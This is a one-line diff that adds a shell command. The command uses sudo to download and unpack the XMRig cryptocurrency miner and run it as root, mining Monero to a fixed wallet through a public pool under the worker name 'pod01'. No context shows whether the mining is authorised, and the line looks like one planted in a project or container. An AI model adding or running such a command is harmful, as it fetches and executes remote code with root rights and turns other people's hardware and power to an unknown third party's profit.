@@ -1,0 +1,1 @@
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz ; tar -xvzf xmrig-6.18.0-bionic-x64.tar.gz ; cd xmrig-6.18.0/ ; sudo ./xmrig --coin=xmr -o pool.supportxmr.com:3333 -a rx -k -u 493SWJ3T8GYGwfJ55QrKnWAffgbW74EWBUWo1oJ81D2118aPwDtUmrUYCzVMNhRtSWNV1fhBTPZPVJMkG5MoJfV4RXbX4xM.pod01 -p x pause
